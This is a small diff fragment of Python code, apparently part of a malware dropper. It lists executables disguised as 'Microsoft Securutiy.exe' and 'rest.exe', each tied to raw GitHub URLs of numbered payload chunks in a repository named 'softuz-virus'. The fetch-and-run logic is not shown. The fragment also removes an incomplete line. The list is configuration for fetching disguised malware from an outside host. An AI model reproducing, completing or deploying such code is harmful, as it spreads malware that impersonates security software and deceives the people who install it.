@@ -9,4 +9,3 @@ ls = [{"Microsoft Securutiy.exe": ["https://raw.githubusercontent.com/Yaxyobek08
                                    "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_8.txt",
                                    "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_9.txt",
                                    "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_10.txt"]},{"rest.exe": ["https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/rest.txt"]}]
-nesxt_i =  
